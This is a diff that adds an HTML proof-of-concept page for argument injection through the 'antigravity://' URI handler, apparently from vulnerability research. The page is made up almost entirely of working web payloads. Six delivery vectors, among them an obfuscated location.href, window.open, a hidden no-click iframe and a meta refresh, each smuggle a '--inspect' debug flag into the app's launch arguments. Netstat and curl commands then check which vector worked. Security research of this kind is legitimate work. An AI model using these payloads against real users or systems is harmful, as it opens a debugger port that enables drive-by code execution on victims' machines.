@@ -1,0 +1,46 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>antigravity:// delivery matrix</title>
+<style>
+ body{font:14px/1.5 system-ui,sans-serif;max-width:900px;margin:2rem auto;padding:0 1rem}
+ code{background:#f4f4f4;padding:1px 5px;border-radius:3px;font-size:13px}
+ li{margin:.9rem 0}
+ button{padding:.45rem .8rem;font:inherit;cursor:pointer}
+ .port{color:#b00;font-weight:600}
+</style>
+<h1>antigravity:// argument-injection delivery matrix</h1>
+<p>Each vector uses a <b class="port">different --inspect port</b>, so whichever port ends up
+listening tells us exactly which delivery method survived the browser's URI encoding.</p>
+<p><b>Before testing:</b> close Antigravity completely (single-instance lock makes a second launch
+exit immediately). Test <b>one vector at a time</b>, close the app between each.</p>
+
+<ol>
+  <li><b>Plain link (literal quote in href)</b> &rarr; port <span class="port">9241</span><br>
+    <a href='antigravity://x/" --inspect=9241 "--foo'>click me</a>
+  </li>
+
+  <li><b>Link with HTML-entity quotes</b> &rarr; port <span class="port">9242</span><br>
+    <a href="antigravity://x/&quot; --inspect=9242 &quot;--foo">click me</a>
+  </li>
+
+  <li><b>JS navigation (location.href)</b> &rarr; port <span class="port">9243</span><br>
+    <button onclick='location.href = String.fromCharCode(97,110,116,105,103,114,97,118,105,116,121)+"://x/\" --inspect=9243 \"--foo"'>go</button>
+  </li>
+
+  <li><b>window.open</b> &rarr; port <span class="port">9244</span><br>
+    <button onclick='window.open("antigravity://x/\" --inspect=9244 \"--foo")'>go</button>
+  </li>
+
+  <li><b>Hidden iframe (no click)</b> &rarr; port <span class="port">9245</span><br>
+    <button onclick='var f=document.createElement("iframe");f.style.display="none";f.src="antigravity://x/\" --inspect=9245 \"--foo";document.body.appendChild(f)'>inject iframe</button>
+  </li>
+
+  <li><b>Meta refresh</b> &rarr; port <span class="port">9246</span><br>
+    <button onclick='var m=document.createElement("meta");m.httpEquiv="refresh";m.content="0;url=antigravity://x/\" --inspect=9246 \"--foo";document.head.appendChild(m)'>go</button>
+  </li>
+</ol>
+
+<h2>Check which one landed</h2>
+<pre><code>netstat -ano | findstr "9241 9242 9243 9244 9245 9246"</code></pre>
+<p>Then confirm the inspector on whichever port answered:</p>
+<pre><code>curl.exe http://127.0.0.1:&lt;PORT&gt;/json/version</code></pre>
